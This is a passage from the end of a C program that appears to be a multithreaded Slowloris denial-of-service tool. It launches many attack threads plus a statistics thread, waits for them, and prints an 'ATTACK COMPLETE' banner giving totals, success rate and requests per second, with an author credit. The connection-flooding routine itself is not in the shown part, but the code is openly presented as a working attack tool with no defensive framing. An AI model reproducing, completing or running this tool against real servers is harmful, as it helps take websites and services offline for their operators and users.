        if (pthread_create(&threads[i], NULL, ultimate_slowloris_thread, (void *)&args[i]) != 0) {
            fprintf(stderr, "[!] Failed to create thread %d\n", i);
            return 1;
        }
    }
    
    // Stats thread
    pthread_t stats_t;
    pthread_create(&stats_t, NULL, stats_thread, NULL);
    
    // Wait for threads
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    running = 0;
    pthread_join(stats_t, NULL);
    
    // Final stats
    time_t end_time = time(NULL);
    double elapsed = difftime(end_time, start_time);
    
    printf("\n\n");
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║  ATTACK COMPLETE                                                  ║\n");
    printf("╠═══════════════════════════════════════════════════════════════════╣\n");
    printf("║  Duration:      %.1f seconds                                   ║\n", elapsed);
    printf("║  Total Req:     %lu                                              ║\n", total_requests);
    printf("║  Successful:    %lu                                              ║\n", successful_requests);
    printf("║  Failed:        %lu                                              ║\n", failed_requests);
    printf("║  Success Rate:  %.1f%%                                         ║\n", 
           total_requests > 0 ? (successful_requests / (double)total_requests) * 100 : 0);
    printf("║  Avg RPS:       %.1f                                             ║\n", 
           elapsed > 0 ? total_requests / elapsed : 0);
    printf("║                                                                   ║\n");
    printf("║  Made by Nothing?!?  ⚡                                           ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n");
    printf("\n");
    
    return 0;
}
